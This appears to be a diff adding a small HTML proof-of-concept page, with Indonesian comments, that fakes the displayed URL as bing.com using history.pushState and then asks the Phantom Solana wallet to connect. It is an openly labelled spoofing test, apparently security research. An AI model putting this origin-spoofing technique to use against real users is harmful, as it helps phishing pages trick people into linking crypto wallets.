@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phantom Wallet Spoofing Test</title>
+    <script>
+        // Fungsi spoofing untuk Phantom Wallet
+        function spoofOriginAndConnect() {
+            console.log("Spoofing test initiated...");
+
+            // Manipulasi URL di address bar
+            history.pushState({}, "Trusted Page", "https://bing.com:1234");
+
+            // Coba berinteraksi dengan Phantom Wallet
+            try {
+                setTimeout(() => {
+                    if (window.phantom && window.phantom.solana) {
+                        window.phantom.solana.connect()
+                            .then((response) => {
+                                console.log("Connection successful:", response);
+                                alert("Wallet connected: " + JSON.stringify(response));
+                            })
+                            .catch((error) => {
+                                console.error("Connection failed:", error);
+                                alert("Connection failed: " + error.message);
+                            });
+                    } else {
+                        console.error("Phantom Wallet not detected.");
+                        alert("Phantom Wallet not detected.");
+                    }
+                }, 1000);
+            } catch (e) {
+                console.error("Error during spoofing attempt:", e);
+                alert("Error during spoofing attempt: " + e.message);
+            }
+        }
+
+        // Tambahkan listener saat DOM siap
+        document.addEventListener("DOMContentLoaded", () => {
+            const button = document.getElementById("spoof-test-btn");
+            button.addEventListener("click", spoofOriginAndConnect);
+        });
+    </script>
+</head>
+<body>
+    <h1>Phantom Wallet Spoofing Test</h1>
+    <button id="spoof-test-btn">Run Spoofing Test</button>
+</body>
+</html>
